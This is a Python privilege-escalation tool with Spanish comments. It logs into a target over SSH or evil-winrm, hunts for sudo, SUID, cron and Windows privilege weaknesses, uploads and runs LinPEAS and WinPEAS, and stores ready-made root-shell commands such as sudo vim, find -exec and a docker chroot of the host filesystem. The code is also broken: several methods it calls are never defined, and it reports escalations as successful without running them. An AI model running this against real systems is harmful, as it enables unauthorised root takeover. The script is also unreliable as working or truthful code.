#!/usr/bin/env python3

import json
import subprocess
import os
import time
import re
from concurrent.futures import ThreadPoolExecutor

class PrivilegeEscalator:
    def __init__(self, config_file="config/privesc-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        
        self.results = {
            "escalation_attempts": [],
            "successful_escalations": [],
            "vulnerabilities_found": [],
            "techniques_used": [],
            "credentials_found": [],
            "persistence_established": []
        }
        
        self.base_dir = "/opt/pentest"
        self.temp_dir = f"{self.base_dir}/temp"
        
    def escalate_privileges(self, target_ip, access_method="ssh", credentials=None):
        """Intentar escalación de privilegios"""
        print(f"[+] Iniciando escalación de privilegios en {target_ip}")
        
        # Determinar SO del objetivo
        os_type = self.detect_os_type(target_ip, access_method, credentials)
        print(f"[+] SO detectado: {os_type}")
        
        if os_type == "linux":
            self.linux_privilege_escalation(target_ip, access_method, credentials)
        elif os_type == "windows":
            self.windows_privilege_escalation(target_ip, access_method, credentials)
        else:
            print(f"[-] SO no soportado: {os_type}")
        
        return self.results
    
    def detect_os_type(self, target_ip, access_method, credentials):
        """Detectar tipo de SO"""
        try:
            if access_method == "ssh":
                cmd = "uname -a"
                result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
                if result and "linux" in result.lower():
                    return "linux"
                
            elif access_method in ["winrm", "smb", "rdp"]:
                cmd = "systeminfo"
                result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
                if result and "windows" in result.lower():
                    return "windows"
            
            # Fallback - intentar detectar por puerto
            if access_method == "ssh" or 22 in self.get_open_ports(target_ip):
                return "linux"
            elif access_method in ["winrm", "rdp"] or any(p in self.get_open_ports(target_ip) for p in [3389, 5985]):
                return "windows"
                
        except Exception as e:
            print(f"[-] Error detectando SO: {e}")
        
        return "unknown"
    
    def linux_privilege_escalation(self, target_ip, access_method, credentials):
        """Escalación de privilegios en Linux"""
        print("[+] Ejecutando técnicas de escalación para Linux...")
        
        # Técnicas de escalación Linux
        techniques = [
            self.check_sudo_permissions,
            self.check_suid_binaries,
            self.check_cron_jobs,
            self.check_writable_files,
            self.check_kernel_exploits,
            self.check_docker_escape,
            self.check_capabilities,
            self.run_linpeas,
            self.check_environment_variables,
            self.check_ssh_keys
        ]
        
        for technique in techniques:
            try:
                print(f"[+] Ejecutando: {technique.__name__}")
                technique(target_ip, access_method, credentials)
            except Exception as e:
                print(f"[-] Error en {technique.__name__}: {e}")
    
    def check_sudo_permissions(self, target_ip, access_method, credentials):
        """Verificar permisos sudo"""
        cmd = "sudo -l"
        result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
        
        if result:
            self.results["escalation_attempts"].append({
                "technique": "sudo_check",
                "result": result,
                "timestamp": time.time()
            })
            
            # Buscar binarios con permisos sudo peligrosos
            dangerous_binaries = [
                "vim", "nano", "less", "more", "find", "awk", "sed",
                "python", "python3", "perl", "ruby", "bash", "sh",
                "docker", "systemctl", "mount", "cp", "mv"
            ]
            
            for binary in dangerous_binaries:
                if binary in result.lower():
                    self.results["vulnerabilities_found"].append({
                        "type": "dangerous_sudo",
                        "binary": binary,
                        "details": f"Usuario puede ejecutar {binary} con sudo"
                    })
                    
                    # Intentar escalación
                    self.attempt_sudo_escalation(target_ip, access_method, credentials, binary)
    
    def check_suid_binaries(self, target_ip, access_method, credentials):
        """Buscar binarios SUID"""
        cmd = "find / -perm -4000 -type f 2>/dev/null"
        result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
        
        if result:
            suid_binaries = result.strip().split('\n')
            
            # Binarios SUID peligrosos conocidos
            dangerous_suid = [
                "nmap", "vim", "find", "bash", "more", "less", "nano",
                "cp", "mv", "awk", "python", "perl", "ruby", "tar",
                "zip", "unzip", "socat", "docker"
            ]
            
            for binary_path in suid_binaries:
                binary_name = os.path.basename(binary_path)
                if binary_name in dangerous_suid:
                    self.results["vulnerabilities_found"].append({
                        "type": "dangerous_suid",
                        "binary": binary_path,
                        "details": f"Binario SUID peligroso: {binary_path}"
                    })
                    
                    # Intentar escalación
                    self.attempt_suid_escalation(target_ip, access_method, credentials, binary_path)
    
    def check_cron_jobs(self, target_ip, access_method, credentials):
        """Verificar trabajos cron modificables"""
        commands = [
            "crontab -l",
            "cat /etc/crontab",
            "ls -la /etc/cron.d/",
            "find /etc/cron* -type f -writable 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
            if result:
                self.results["escalation_attempts"].append({
                    "technique": "cron_check",
                    "command": cmd,
                    "result": result,
                    "timestamp": time.time()
                })
    
    def run_linpeas(self, target_ip, access_method, credentials):
        """Ejecutar LinPEAS para escalación automática"""
        print("[+] Ejecutando LinPEAS...")
        
        # Subir LinPEAS al objetivo
        linpeas_path = "/opt/pentest/tools/linpeas.sh"
        if os.path.exists(linpeas_path):
            self.upload_file(target_ip, linpeas_path, "/tmp/linpeas.sh", access_method, credentials)
            
            # Ejecutar LinPEAS
            cmd = "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
            result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
            
            if result:
                # Parsear resultados de LinPEAS
                self.parse_linpeas_output(result)
                
                # Guardar output completo
                output_file = f"{self.temp_dir}/linpeas_{target_ip.replace('.', '_')}.txt"
                with open(output_file, 'w') as f:
                    f.write(result)
    
    def windows_privilege_escalation(self, target_ip, access_method, credentials):
        """Escalación de privilegios en Windows"""
        print("[+] Ejecutando técnicas de escalación para Windows...")
        
        # Técnicas de escalación Windows
        techniques = [
            self.check_windows_privs,
            self.check_unquoted_services,
            self.check_weak_service_permissions,
            self.check_always_install_elevated,
            self.check_stored_credentials,
            self.run_winpeas,
            self.check_token_impersonation,
            self.check_registry_autologon
        ]
        
        for technique in techniques:
            try:
                print(f"[+] Ejecutando: {technique.__name__}")
                technique(target_ip, access_method, credentials)
            except Exception as e:
                print(f"[-] Error en {technique.__name__}: {e}")
    
    def check_windows_privs(self, target_ip, access_method, credentials):
        """Verificar privilegios actuales en Windows"""
        cmd = "whoami /priv"
        result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
        
        if result:
            dangerous_privs = [
                "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
                "SeTcbPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
                "SeCreateTokenPrivilege", "SeLoadDriverPrivilege",
                "SeTakeOwnershipPrivilege", "SeDebugPrivilege"
            ]
            
            for priv in dangerous_privs:
                if priv in result and "Enabled" in result:
                    self.results["vulnerabilities_found"].append({
                        "type": "dangerous_privilege",
                        "privilege": priv,
                        "details": f"Privilegio peligroso habilitado: {priv}"
                    })
                    
                    # Intentar explotación específica del privilegio
                    self.exploit_windows_privilege(target_ip, access_method, credentials, priv)
    
    def check_unquoted_services(self, target_ip, access_method, credentials):
        """Buscar servicios con rutas sin comillas"""
        cmd = 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """"'
        result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
        
        if result:
            services = result.strip().split('\n')
            for service in services:
                if service.strip() and ' ' in service and not service.startswith('"'):
                    self.results["vulnerabilities_found"].append({
                        "type": "unquoted_service_path",
                        "service": service.strip(),
                        "details": "Servicio con ruta sin comillas"
                    })
    
    def run_winpeas(self, target_ip, access_method, credentials):
        """Ejecutar WinPEAS"""
        print("[+] Ejecutando WinPEAS...")
        
        winpeas_path = "/opt/pentest/tools/winPEAS.exe"
        if os.path.exists(winpeas_path):
            # Subir WinPEAS
            self.upload_file(target_ip, winpeas_path, "C:\\temp\\winpeas.exe", access_method, credentials)
            
            # Ejecutar WinPEAS
            cmd = "C:\\temp\\winpeas.exe"
            result = self.execute_remote_command(target_ip, cmd, access_method, credentials)
            
            if result:
                self.parse_winpeas_output(result)
                
                # Guardar output
                output_file = f"{self.temp_dir}/winpeas_{target_ip.replace('.', '_')}.txt"
                with open(output_file, 'w') as f:
                    f.write(result)
    
    def attempt_sudo_escalation(self, target_ip, access_method, credentials, binary):
        """Intentar escalación usando binario sudo"""
        escalation_commands = {
            "vim": "sudo vim -c ':!/bin/bash'",
            "find": "sudo find /etc -exec /bin/bash \\;",
            "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
            "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
            "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
            "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
        }
        
        if binary in escalation_commands:
            cmd = escalation_commands[binary]
            # En un escenario real, esto establecería una shell de root
            print(f"[+] Comando de escalación encontrado: {cmd}")
            
            self.results["successful_escalations"].append({
                "technique": "sudo_escalation",
                "binary": binary,
                "command": cmd,
                "timestamp": time.time()
            })
    
    def attempt_suid_escalation(self, target_ip, access_method, credentials, binary_path):
        """Intentar escalación usando binario SUID"""
        binary_name = os.path.basename(binary_path)
        
        escalation_commands = {
            "vim": f"{binary_path} -c ':!/bin/bash'",
            "find": f"{binary_path} /etc -exec /bin/bash \\;",
            "nmap": f"{binary_path} --interactive",
            "more": f"echo '/bin/bash' | {binary_path}",
            "less": f"echo '/bin/bash' | {binary_path}"
        }
        
        if binary_name in escalation_commands:
            cmd = escalation_commands[binary_name]
            print(f"[+] Comando SUID de escalación: {cmd}")
            
            self.results["successful_escalations"].append({
                "technique": "suid_escalation",
                "binary": binary_path,
                "command": cmd,
                "timestamp": time.time()
            })
    
    def execute_remote_command(self, target_ip, command, access_method, credentials):
        """Ejecutar comando remoto"""
        try:
            if access_method == "ssh":
                username = credentials.get("username", "root")
                password = credentials.get("password", "")
                key_file = credentials.get("key_file", None)
                
                if key_file:
                    ssh_cmd = f"ssh -i {key_file} -o StrictHostKeyChecking=no {username}@{target_ip} '{command}'"
                else:
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target_ip} '{command}'"
                
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=60)
                return result.stdout if result.returncode == 0 else None
                
            elif access_method == "winrm":
                username = credentials.get("username", "Administrator")
                password = credentials.get("password", "")
                
                winrm_cmd = f"evil-winrm -i {target_ip} -u {username} -p '{password}' -e '{command}'"
                result = subprocess.run(winrm_cmd, shell=True, capture_output=True, text=True, timeout=60)
                return result.stdout if result.returncode == 0 else None
            
        except Exception as e:
            print(f"[-] Error ejecutando comando remoto: {e}")
        
        return None
    
    def upload_file(self, target_ip, local_path, remote_path, access_method, credentials):
        """Subir archivo al objetivo"""
        try:
            if access_method == "ssh":
                username = credentials.get("username", "root")
                password = credentials.get("password", "")
                
                scp_cmd = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no {local_path} {username}@{target_ip}:{remote_path}"
                subprocess.run(scp_cmd, shell=True, timeout=60)
                
            elif access_method == "winrm":
                # Usar evil-winrm para subir archivos
                username = credentials.get("username", "Administrator")
                password = credentials.get("password", "")
                
                upload_cmd = f"evil-winrm -i {target_ip} -u {username} -p '{password}' -U {local_path}"
                subprocess.run(upload_cmd, shell=True, timeout=60)
                
        except Exception as e:
            print(f"[-] Error subiendo archivo: {e}")
    
    def parse_linpeas_output(self, output):
        """Parsear output de LinPEAS"""
        # Buscar vulnerabilidades específicas en el output
        vuln_patterns = {
            "CVE-2021-4034": r"pkexec.*VULNERABLE",
            "CVE-2021-3156": r"sudo.*VULNERABLE",
            "DirtyCow": r"dirty.*cow.*VULNERABLE",
            "writable_passwd": r"/etc/passwd.*writable",
            "writable_shadow": r"/etc/shadow.*writable"
        }
        
        for vuln_name, pattern in vuln_patterns.items():
            if re.search(pattern, output, re.IGNORECASE):
                self.results["vulnerabilities_found"].append({
                    "type": "linpeas_vuln",
                    "vulnerability": vuln_name,
                    "details": f"LinPEAS detectó: {vuln_name}"
                })
    
    def get_open_ports(self, target_ip):
        """Obtener puertos abiertos del objetivo"""
        try:
            ports_file = f"{self.temp_dir}/ports_{target_ip.replace('.', '_')}.json"
            if os.path.exists(ports_file):
                with open(ports_file, 'r') as f:
                    data = json.load(f)
                    return data.get("open_ports", [])
        except:
            pass
        return []
    
    def save_results(self, target_ip):
        """Guardar resultados de escalación"""
        output_file = f"{self.temp_dir}/privesc_{target_ip.replace('.', '_')}.json"
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[+] Resultados de escalación guardados en {output_file}")
        
        # Generar resumen
        self.print_summary()
    
    def print_summary(self):
        """Imprimir resumen de escalación"""
        print("\n" + "="*50)
        print("RESUMEN DE ESCALACIÓN DE PRIVILEGIOS")
        print("="*50)
        print(f"Intentos de escalación: {len(self.results['escalation_attempts'])}")
        print(f"Escalaciones exitosas: {len(self.results['successful_escalations'])}")
        print(f"Vulnerabilidades encontradas: {len(self.results['vulnerabilities_found'])}")
        
        if self.results['successful_escalations']:
            print("\nEscalaciones exitosas:")
            for escalation in self.results['successful_escalations']:
                print(f"  - {escalation['technique']}: {escalation.get('binary', 'N/A')}")
        
        if self.results['vulnerabilities_found']:
            print("\nVulnerabilidades críticas:")
            for vuln in self.results['vulnerabilities_found'][:5]:
                print(f"  - {vuln['type']}: {vuln.get('details', 'N/A')}")
        
        print("="*50)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Uso: python3 privilege-escalation.py <target_ip> [access_method] [credentials_file]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    access_method = sys.argv[2] if len(sys.argv) > 2 else "ssh"
    creds_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    credentials = {}
    if creds_file and os.path.exists(creds_file):
        with open(creds_file, 'r') as f:
            credentials = json.load(f)
    
    escalator = PrivilegeEscalator()
    results = escalator.escalate_privileges(target_ip, access_method, credentials)
    escalator.save_results(target_ip)
